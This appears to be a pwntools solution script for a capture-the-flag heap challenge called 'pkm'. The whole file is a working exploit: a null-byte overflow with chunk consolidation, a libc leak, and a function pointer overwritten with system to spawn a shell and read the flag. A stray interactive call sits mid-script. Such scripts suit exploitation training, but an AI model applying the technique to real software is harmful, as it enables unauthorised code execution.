from pwn import *

CHALL_PATH = "./pkm_patched"
CHALL = ELF(CHALL_PATH)
LIBC_PATH = "./downloads/libc-2.23.so"
LIBC = ELF(LIBC_PATH)
COMMANDS = """
c
""" 

def add_pkm(c):
    c.recvuntil(b"> ")
    c.sendline(b"0")

def rename_pkm(c, pkm_index, length, new_name):
    c.recvuntil(b"> ")
    c.sendline(b"1")
    c.recvuntil(b"> ")
    c.sendline(b"%d" % pkm_index)
    c.recvuntil(b"[.] insert length: ")
    c.sendline(b"%d" % length)
    time.sleep(0.1)
    c.send(new_name)

def rename(c, pkm_index, new_name):
    rename_pkm(c, pkm_index, len(new_name), new_name)


def delete_pkm(c, pkm_index):
    c.recvuntil(b"> ")
    c.sendline(b"2")
    c.recvuntil(b"> ")
    c.sendline(b"%d" % pkm_index)

def fight_pkm(c, pkm_first, move, pkm_second):
    c.recvuntil(b"> ")
    c.sendline(b"3")
    c.recvuntil(b"> ")
    c.sendline(b"%d" % pkm_first)
    c.recvuntil(b"> ")
    c.sendline(b"%d" % move)
    c.recvuntil(b"> ")
    c.sendline(b"%d" % pkm_second)

def info_pkm(c, pkm_index):
    c.recvuntil(b"> ")
    c.sendline(b"4")
    c.recvuntil(b"> ")
    c.sendline(b"%d" % pkm_index)
    nameline = c.recvuntil(b" *ATK")[:-len(" *ATK")]
    m = re.match(b" \*Name: (.+)", nameline)
    return m.group(1)

def quit(c):
    c.recvuntil(b"> ")
    c.sendline(b"5")

def pkm(index, ptr_name, ptr_move = None):
    binsh = int(b"/bin/sh\x00"[::-1].hex(), 16)
    pkm = b""
    pkm += p64(binsh) + p64(420) # atk, def
    pkm += p64(420) + p64(420) # hp, total_hp
    pkm += p64(0xdeadbeef) + p64(ptr_name) # undefined8, name*
    pkm += p64(index) # index
    for _ in range(4):
        pkm += p64(0xdeadbeef) # undefined8

    if(ptr_move is not None):
        pkm += p64(0x0040202f) # move name: "Tackle"
        pkm += p64(ptr_move)

    pkm += b"\x00" * (0xf8 - len(pkm)) # padding
    return pkm

if args.GDB:
    c = gdb.debug(CHALL_PATH, COMMANDS)
elif args.REM:
    c = remote("pkm.training.offensivedefensive.it", 8080, ssl=True)
else:
    c = process(CHALL_PATH)


for i in range(3):
    add_pkm(c)

rename(c, 0, b"A"*0x108) # A
rename(c, 1, b"B"*0x208) # B, fits two pkm
rename(c, 2, b"C"*0x100) # C

delete_pkm(c, 1) # free(B)

add_pkm(c) # index 1 (A, empty, C)

rename(c, 0, b"A"*0x108) # Single Null Byte Overflow

add_pkm(c) # B1, index 3

add_pkm(c) # B2, index 4

delete_pkm(c, 3) # free(B1)
delete_pkm(c, 2) # Free(C) trigger the merge with the previous chunk

rename(c, 1, b"D"*0x100 + pkm(4, 0x00404018))
c.interactive()
name = info_pkm(c, 4) + b"\x00"*2
leak_free = u64(name)
LIBC.address = (leak_free - LIBC.symbols.free)

print("[!] leak free: %#x" % leak_free)
print("[!] libc: %#x" % LIBC.address)
print("[!] system: %#x" % LIBC.symbols.system)

## Second Stage, add a move

for i in range(3):
    add_pkm(c) # indexes [2, 3, 5]

rename(c, 2, b"A"*0x108) # A
rename(c, 3, b"B"*0x208) # B, fits two pkm
rename(c, 5, b"C"*0x100) # C

delete_pkm(c, 3) # free(B)

add_pkm(c) # index 3 (A, empty, C)

rename(c, 2, b"A"*0x108) # Single Null Byte Overflow

add_pkm(c) # B1, index 6

add_pkm(c) # B2, index 7

delete_pkm(c, 6) # free(B1)
delete_pkm(c, 5) # Free(C) trigger the merge with the previous chunk

rename(c, 3, b"D"*0x100 + pkm(4, 0x00402030, LIBC.symbols.system))

fight_pkm(c, 7, 0, 0)

c.sendline('cat flag')

c.interactive()